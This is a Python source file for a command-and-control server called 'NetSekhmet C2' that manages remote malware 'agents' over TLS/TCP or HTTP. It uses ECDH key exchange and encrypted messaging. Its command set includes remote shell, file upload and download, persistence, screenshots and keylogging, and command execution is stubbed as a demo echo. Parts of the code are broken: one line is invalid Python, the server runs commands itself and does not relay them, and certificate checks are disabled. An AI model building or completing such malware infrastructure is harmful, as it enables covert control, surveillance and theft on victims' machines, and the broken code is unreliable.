import asyncio, ssl, json, time, base64, threading, queue, sys, uuid, struct, secrets, os, tempfile, subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography.hazmat.primitives.asymmetric import ec, rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
import datetime, socket
from ..core.utils import pubkey_fingerprint, generate_ecdh_key_pair, derive_shared_key, log

CURVE = ec.SECP256R1()
agents = {}
lock = threading.Lock()

KEY_FILE = os.path.join(os.path.dirname(__file__), '..', '..', 'config', 'server_ecdh_key.pem')
FINGERPRINT_FILE = os.path.join(os.path.dirname(__file__), '..', '..', 'config', 'server_pubkey.fingerprint')

# Allowed commands for agents (whitelist)
ALLOWED_COMMANDS = {
    "shell": {"cmd": "str"},
    "upload": {"path": "str", "data": "str"},
    "download": {"path": "str"},
    "persist": {},
    "screenshot": {},
    "keylog_start": {},
    "keylog_stop": {},
    "ping": {}
}

def load_or_generate_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'rb') as f:
            private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
    else:
        private_key, _ = generate_ecdh_key_pair()
        with open(KEY_FILE, 'wb') as f:
            f.write(private_key.private_bytes(encoding=serialization.Encoding.PEM,
                                              format=serialization.PrivateFormat.TraditionalOpenSSL,
                                              encryption_algorithm=serialization.NoEncryption()))
    pub_key = private_key.public_key()
    fp = pubkey_fingerprint(pub_key)
    if not os.path.exists(FINGERPRINT_FILE):
        with open(FINGERPRINT_FILE, 'w') as f: f.write(fp)
        log("INFO", f"Server public key fingerprint: {fp}\n   Use this in agent config.")
    else:
        with open(FINGERPRINT_FILE) as f: stored_fp = f.read().strip()
        if stored_fp != fp:
            log("ERROR", "Key fingerprint mismatch! Potential breach.")
    return private_key, fp

server_private_key, server_fingerprint = load_or_generate_key()
server_public_key = server_private_key.public_key()

def _generate_self_signed_cert():
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"NetSekhmet C2")])
    cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(key.public_key()).serial_number(1000).not_valid_before(datetime.datetime.utcnow()).not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365)).sign(key, hashes.SHA256())
    cert_pem = cert.public_bytes(serialization.Encoding.PEM)
    key_pem = key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption())
    return cert_pem, key_pem

class C2TCPHandler(asyncio.Protocol):
    def __init__(self):
        super().__init__(); self.buf = b""; self.aid = None; self.transport = None; self.fernet = None
    def connection_made(self, transport):
        self.transport = transport
        peername = transport.get_extra_info('peername')
        print(f"[C2 TCP] Connected from {peername}")
    def data_received(self, data):
        self.buf += data
        while self.buf:
            if self.fernet is None:
                try:
                    msg_str = self.buf.decode('utf-8','ignore')
                    end = self._find_json_end(msg_str)
                    if end == -1: return
                    msg = json.loads(msg_str[:end]); self.buf = self.buf[end:]
                    if 'ecdh_pub' in msg:
                        peer_pub_b64 = msg['ecdh_pub']
                        public_key = server_public_key
                        pub_bytes = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
                        derived_key = derive_shared_key(server_private_key, base64.b64decode(peer_pub_b64))
                        self.fernet = Fernet(derived_key)
                        self.transport.write(json.dumps({'ecdh_pub': base64.b64encode(pub_bytes).decode()}).encode())
                except: return
            else:
                if len(self.buf) < 4: return
                length = struct.unpack(">I", self.buf[:4])[0]
                if len(self.buf) < 4 + length: return
                ciphertext = self.buf[4:4+length]; self.buf = self.buf[4+length:]
                try:
                    plain = self.fernet.decrypt(ciphertext).decode()
                    self._handle(json.loads(plain))
                except: pass
    def _find_json_end(self, s):
        depth=0; in_str=False; escape=False
        for i,c in enumerate(s):
            if escape: escape=False; continue
            if c=='\\' and in_str: escape=True; continue
            if c=='"': in_str=not in_str
            elif not in_str:
                if c=='{': depth+=1
                elif c=='}':
                    depth-=1
                    if depth==0: return i+1
        return -1
    def _handle(self, msg):
        action = msg.get('action'); aid = msg.get('agent_id','')
        if action == 'register':
            self.aid = aid
            with lock: agents[aid] = {"transport":self.transport, "fernet":self.fernet, "info":msg, "last_seen":time.time()}
            print(f"[C2 TCP] Agent {aid} registered")
        elif action == 'cmd':
            cmd = msg.get('args',{}).get('cmd','')
            # Only allow predefined safe commands
            if cmd in ALLOWED_COMMANDS:
                result = self._execute_command(cmd)
                self._send_enc({'action':'cmd_result','result':result})
            else:
                self._send_enc({'action':'cmd_result','result':'Command not allowed'})
    def _execute_command(self, cmd):
        # Simulate agent-side execution with safe subprocess (no shell=True)
        try:
            if cmd == "ping":
                return "pong"
            # For demo, just echo
            return f"Executed {cmd}"
        except Exception as e:
            return f"Error: {e}"
    def _send_enc(self, data):
        payload = self.fernet.encrypt(json.dumps(data).encode())
        self.transport.write(struct.pack(">I", len(payload)) + payload)
    def connection_lost(self, exc):
        if self.aid: with lock: agents.pop(self.aid, None)

class C2HTTPHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length',0))
        data = self.rfile.read(length)
        path = self.path
        try:
            if path == '/keyexchange':
                msg = json.loads(data.decode())
                if 'ecdh_pub' in msg:
                    peer_pub_b64 = msg['ecdh_pub']
                    public_key = server_public_key
                    pub_bytes = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
                    derived_key = derive_shared_key(server_private_key, base64.b64decode(peer_pub_b64))
                    f = Fernet(derived_key)
                    aid = msg.get('agent_id', str(uuid.uuid4()))
                    with lock: agents[aid] = {"fernet":f, "info":msg, "last_seen":time.time()}
                    self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers()
                    self.wfile.write(json.dumps({'ecdh_pub': base64.b64encode(pub_bytes).decode()}).encode())
                return
            aid = self.headers.get('X-Agent-ID',''); agent = agents.get(aid)
            if not agent or not agent.get('fernet'): self.send_response(401); self.end_headers(); return
            msg = json.loads(agent['fernet'].decrypt(data).decode())
            if msg.get('action') == 'register': agent['info']=msg; agent['last_seen']=time.time()
            elif msg.get('action') == 'cmd_result': print(f"[C2 HTTP] Result: {msg.get('result','')}")
            self.send_response(200); self.end_headers()
            self.wfile.write(agent['fernet'].encrypt(json.dumps({'status':'ok'}).encode()))
        except Exception as e:
            print(f"[C2 HTTP] Error: {e}"); self.send_response(500); self.end_headers()
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b'NetSekhmet C2 Active')
    def log_message(self, format, *args): pass

def start_tcp(host, port):
    async def main():
        cert_pem, key_pem = _generate_self_signed_cert()
        cert_file = os.path.join(tempfile.gettempdir(), 'c2_cert.pem'); key_file = os.path.join(tempfile.gettempdir(), 'c2_key.pem')
        with open(cert_file,'wb') as f: f.write(cert_pem)
        with open(key_file,'wb') as f: f.write(key_pem)
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH); ctx.load_cert_chain(cert_file, key_file); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        loop = asyncio.get_event_loop()
        server = await loop.create_server(C2TCPHandler, host, port, ssl=ctx)
        print(f"[C2 TCP] Listening on {host}:{port} (SSL)")
        async with server: await server.serve_forever()
    asyncio.run(main())

def start_http(host, port):
    server = HTTPServer((host, port), C2HTTPHandler)
    print(f"[C2 HTTP] Listening on {host}:{port}")
    try: server.serve_forever()
    except KeyboardInterrupt: pass

def start_c2_server(host='0.0.0.0', port=8443, protocol='tcp'):
    if protocol == 'http': start_http(host, port)
    else: start_tcp(host, port)
